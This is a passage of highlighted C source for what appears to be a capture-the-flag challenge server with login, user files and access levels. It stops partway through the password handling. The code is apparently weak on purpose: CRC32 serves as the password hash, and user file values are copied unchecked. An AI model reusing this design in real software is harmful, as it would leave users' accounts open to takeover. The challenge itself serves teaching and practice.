</span><span class='line'>  <span class="mh">0x44042d73</span><span class="p">,</span> <span class="mh">0x33031de5</span><span class="p">,</span> <span class="mh">0xaa0a4c5f</span><span class="p">,</span> <span class="mh">0xdd0d7cc9</span><span class="p">,</span> <span class="mh">0x5005713c</span><span class="p">,</span> <span class="mh">0x270241aa</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xbe0b1010</span><span class="p">,</span> <span class="mh">0xc90c2086</span><span class="p">,</span> <span class="mh">0x5768b525</span><span class="p">,</span> <span class="mh">0x206f85b3</span><span class="p">,</span> <span class="mh">0xb966d409</span><span class="p">,</span> <span class="mh">0xce61e49f</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x5edef90e</span><span class="p">,</span> <span class="mh">0x29d9c998</span><span class="p">,</span> <span class="mh">0xb0d09822</span><span class="p">,</span> <span class="mh">0xc7d7a8b4</span><span class="p">,</span> <span class="mh">0x59b33d17</span><span class="p">,</span> <span class="mh">0x2eb40d81</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xb7bd5c3b</span><span class="p">,</span> <span class="mh">0xc0ba6cad</span><span class="p">,</span> <span class="mh">0xedb88320</span><span class="p">,</span> <span class="mh">0x9abfb3b6</span><span class="p">,</span> <span class="mh">0x03b6e20c</span><span class="p">,</span> <span class="mh">0x74b1d29a</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xead54739</span><span class="p">,</span> <span class="mh">0x9dd277af</span><span class="p">,</span> <span class="mh">0x04db2615</span><span class="p">,</span> <span class="mh">0x73dc1683</span><span class="p">,</span> <span class="mh">0xe3630b12</span><span class="p">,</span> <span class="mh">0x94643b84</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x0d6d6a3e</span><span class="p">,</span> <span class="mh">0x7a6a5aa8</span><span class="p">,</span> <span class="mh">0xe40ecf0b</span><span class="p">,</span> <span class="mh">0x9309ff9d</span><span class="p">,</span> <span class="mh">0x0a00ae27</span><span class="p">,</span> <span class="mh">0x7d079eb1</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xf00f9344</span><span class="p">,</span> <span class="mh">0x8708a3d2</span><span class="p">,</span> <span class="mh">0x1e01f268</span><span class="p">,</span> <span class="mh">0x6906c2fe</span><span class="p">,</span> <span class="mh">0xf762575d</span><span class="p">,</span> <span class="mh">0x806567cb</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x196c3671</span><span class="p">,</span> <span class="mh">0x6e6b06e7</span><span class="p">,</span> <span class="mh">0xfed41b76</span><span class="p">,</span> <span class="mh">0x89d32be0</span><span class="p">,</span> <span class="mh">0x10da7a5a</span><span class="p">,</span> <span class="mh">0x67dd4acc</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xf9b9df6f</span><span class="p">,</span> <span class="mh">0x8ebeeff9</span><span class="p">,</span> <span class="mh">0x17b7be43</span><span class="p">,</span> <span class="mh">0x60b08ed5</span><span class="p">,</span> <span class="mh">0xd6d6a3e8</span><span class="p">,</span> <span class="mh">0xa1d1937e</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x38d8c2c4</span><span class="p">,</span> <span class="mh">0x4fdff252</span><span class="p">,</span> <span class="mh">0xd1bb67f1</span><span class="p">,</span> <span class="mh">0xa6bc5767</span><span class="p">,</span> <span class="mh">0x3fb506dd</span><span class="p">,</span> <span class="mh">0x48b2364b</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xd80d2bda</span><span class="p">,</span> <span class="mh">0xaf0a1b4c</span><span class="p">,</span> <span class="mh">0x36034af6</span><span class="p">,</span> <span class="mh">0x41047a60</span><span class="p">,</span> <span class="mh">0xdf60efc3</span><span class="p">,</span> <span class="mh">0xa867df55</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x316e8eef</span><span class="p">,</span> <span class="mh">0x4669be79</span><span class="p">,</span> <span class="mh">0xcb61b38c</span><span class="p">,</span> <span class="mh">0xbc66831a</span><span class="p">,</span> <span class="mh">0x256fd2a0</span><span class="p">,</span> <span class="mh">0x5268e236</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xcc0c7795</span><span class="p">,</span> <span class="mh">0xbb0b4703</span><span class="p">,</span> <span class="mh">0x220216b9</span><span class="p">,</span> <span class="mh">0x5505262f</span><span class="p">,</span> <span class="mh">0xc5ba3bbe</span><span class="p">,</span> <span class="mh">0xb2bd0b28</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x2bb45a92</span><span class="p">,</span> <span class="mh">0x5cb36a04</span><span class="p">,</span> <span class="mh">0xc2d7ffa7</span><span class="p">,</span> <span class="mh">0xb5d0cf31</span><span class="p">,</span> <span class="mh">0x2cd99e8b</span><span class="p">,</span> <span class="mh">0x5bdeae1d</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x9b64c2b0</span><span class="p">,</span> <span class="mh">0xec63f226</span><span class="p">,</span> <span class="mh">0x756aa39c</span><span class="p">,</span> <span class="mh">0x026d930a</span><span class="p">,</span> <span class="mh">0x9c0906a9</span><span class="p">,</span> <span class="mh">0xeb0e363f</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x72076785</span><span class="p">,</span> <span class="mh">0x05005713</span><span class="p">,</span> <span class="mh">0x95bf4a82</span><span class="p">,</span> <span class="mh">0xe2b87a14</span><span class="p">,</span> <span class="mh">0x7bb12bae</span><span class="p">,</span> <span class="mh">0x0cb61b38</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x92d28e9b</span><span class="p">,</span> <span class="mh">0xe5d5be0d</span><span class="p">,</span> <span class="mh">0x7cdcefb7</span><span class="p">,</span> <span class="mh">0x0bdbdf21</span><span class="p">,</span> <span class="mh">0x86d3d2d4</span><span class="p">,</span> <span class="mh">0xf1d4e242</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x68ddb3f8</span><span class="p">,</span> <span class="mh">0x1fda836e</span><span class="p">,</span> <span class="mh">0x81be16cd</span><span class="p">,</span> <span class="mh">0xf6b9265b</span><span class="p">,</span> <span class="mh">0x6fb077e1</span><span class="p">,</span> <span class="mh">0x18b74777</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x88085ae6</span><span class="p">,</span> <span class="mh">0xff0f6a70</span><span class="p">,</span> <span class="mh">0x66063bca</span><span class="p">,</span> <span class="mh">0x11010b5c</span><span class="p">,</span> <span class="mh">0x8f659eff</span><span class="p">,</span> <span class="mh">0xf862ae69</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x616bffd3</span><span class="p">,</span> <span class="mh">0x166ccf45</span><span class="p">,</span> <span class="mh">0xa00ae278</span><span class="p">,</span> <span class="mh">0xd70dd2ee</span><span class="p">,</span> <span class="mh">0x4e048354</span><span class="p">,</span> <span class="mh">0x3903b3c2</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xa7672661</span><span class="p">,</span> <span class="mh">0xd06016f7</span><span class="p">,</span> <span class="mh">0x4969474d</span><span class="p">,</span> <span class="mh">0x3e6e77db</span><span class="p">,</span> <span class="mh">0xaed16a4a</span><span class="p">,</span> <span class="mh">0xd9d65adc</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x40df0b66</span><span class="p">,</span> <span class="mh">0x37d83bf0</span><span class="p">,</span> <span class="mh">0xa9bcae53</span><span class="p">,</span> <span class="mh">0xdebb9ec5</span><span class="p">,</span> <span class="mh">0x47b2cf7f</span><span class="p">,</span> <span class="mh">0x30b5ffe9</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xbdbdf21c</span><span class="p">,</span> <span class="mh">0xcabac28a</span><span class="p">,</span> <span class="mh">0x53b39330</span><span class="p">,</span> <span class="mh">0x24b4a3a6</span><span class="p">,</span> <span class="mh">0xbad03605</span><span class="p">,</span> <span class="mh">0xcdd70693</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x54de5729</span><span class="p">,</span> <span class="mh">0x23d967bf</span><span class="p">,</span> <span class="mh">0xb3667a2e</span><span class="p">,</span> <span class="mh">0xc4614ab8</span><span class="p">,</span> <span class="mh">0x5d681b02</span><span class="p">,</span> <span class="mh">0x2a6f2b94</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xb40bbe37</span><span class="p">,</span> <span class="mh">0xc30c8ea1</span><span class="p">,</span> <span class="mh">0x5a05df1b</span><span class="p">,</span> <span class="mh">0x2d02ef8d</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// no. you&#39;re *not* supposed to bruteforce this challenge. 2^32 is still a</span>
</span><span class='line'><span class="c1">// bit much.</span>
</span><span class='line'><span class="kt">uint32_t</span> <span class="nf">hash_password</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
</span><span class='line'>  <span class="kt">uint32_t</span> <span class="n">crc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">crc</span> <span class="o">=</span> <span class="n">crc</span> <span class="o">^</span> <span class="o">~</span><span class="mi">0U</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">size</span><span class="o">--</span><span class="p">)</span>
</span><span class='line'>    <span class="n">crc</span> <span class="o">=</span> <span class="n">crc32_tab</span><span class="p">[(</span><span class="n">crc</span> <span class="o">^</span> <span class="o">*</span><span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">crc</span> <span class="o">^</span> <span class="o">~</span><span class="mi">0U</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// usernames must match /^[a-zA-Z0-9_]{1,20}$/</span>
</span><span class='line'><span class="n">bool</span> <span class="nf">username_sane</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">user</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">user</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">user</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">&gt;=</span> <span class="sc">&#39;a&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">p</span> <span class="o">&lt;=</span> <span class="sc">&#39;z&#39;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">&gt;=</span> <span class="sc">&#39;A&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">p</span> <span class="o">&lt;=</span> <span class="sc">&#39;Z&#39;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">&gt;=</span> <span class="sc">&#39;0&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">p</span> <span class="o">&lt;=</span> <span class="sc">&#39;9&#39;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">==</span> <span class="sc">&#39;_&#39;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">rtrim</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">str</span><span class="o">+</span><span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="n">p</span> <span class="o">&gt;=</span> <span class="n">str</span><span class="p">;</span> <span class="n">p</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">!=</span> <span class="sc">&#39;\r&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">p</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">p</span> <span class="o">!=</span> <span class="sc">&#39; &#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">p</span> <span class="o">!=</span> <span class="sc">&#39;\t&#39;</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">open_userfile</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">username_sane</span><span class="p">(</span><span class="n">user</span><span class="p">))</span> <span class="p">{</span> <span class="n">errno</span> <span class="o">=</span> <span class="n">EACCES</span><span class="p">;</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// construct path: &quot;users/{username}&quot;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">6</span><span class="o">+</span><span class="mi">20</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;users/&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">path</span><span class="o">+</span><span class="mi">6</span><span class="p">,</span> <span class="n">user</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="mo">0700</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">userdata</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">uint32_t</span> <span class="n">hash</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">access_level</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">description</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="nf">read_userfile</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="n">res</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">res</span><span class="p">));</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open_userfile</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fdopen</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">f</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">rtrim</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="n">line</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">eqsign</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;=&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">eqsign</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>    <span class="o">*</span><span class="n">eqsign</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">value</span> <span class="o">=</span> <span class="n">eqsign</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;hash&quot;</span><span class="p">))</span> <span class="n">res</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">=</span> <span class="n">atoll</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;access_level&quot;</span><span class="p">))</span> <span class="n">res</span><span class="o">-&gt;</span><span class="n">access_level</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;description&quot;</span><span class="p">))</span> <span class="n">strcpy</span><span class="p">(</span><span class="n">res</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fatal error: bad key </span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s"> in config, aborting</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">key</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">write_userfile</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">,</span> <span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="n">ud</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open_userfile</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="o">|</span><span class="n">O_TRUNC</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="n">perror</span><span class="p">(</span><span class="s">&quot;can&#39;t open userdata&quot;</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fdopen</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="n">perror</span><span class="p">(</span><span class="s">&quot;can&#39;t fdopen userdata&quot;</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&quot;hash=%llu</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ud</span><span class="o">-&gt;</span><span class="n">hash</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&quot;access_level=%u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ud</span><span class="o">-&gt;</span><span class="n">access_level</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&quot;description=%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ud</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">handle</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">alarm</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// Let&#39;s handle the socket like a normal terminal or so. Makes the code much</span>
</span><span class='line'>  <span class="c1">// nicer. :)</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">==-</span><span class="mi">1</span> <span class="o">||</span> <span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">==-</span><span class="mi">1</span><span class="p">)</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="n">ud</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>  <span class="n">bool</span> <span class="n">logged_in</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span> <span class="cm">/* last incoming command */</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;&gt; &quot;</span><span class="p">),</span> <span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">rtrim</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">line</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">params</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39; &#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">params</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="o">*</span><span class="n">params</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span><span class='line'>      <span class="n">params</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;whoami&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">((</span><span class="n">logged_in</span><span class="o">?</span><span class="s">&quot;You are logged in as %s.</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">:</span><span class="s">&quot;You are not logged in.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">),</span> <span class="n">username</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;user&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">params</span> <span class="o">||</span> <span class="o">!</span><span class="n">username_sane</span><span class="p">(</span><span class="n">params</span><span class="p">))</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;missing/bad username</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="n">strcpy</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">params</span><span class="p">);</span>
</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="n">ud</span><span class="p">);</span>
</span><span class='line'>      <span class="n">logged_in</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span><span class='line'>      <span class="n">ud</span> <span class="o">=</span> <span class="n">read_userfile</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">ud</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;username accepted, please provide password</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">perror</span><span class="p">(</span><span class="s">&quot;username not accepted&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;pass&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ud</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;invalid request</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">params</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;missing password</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
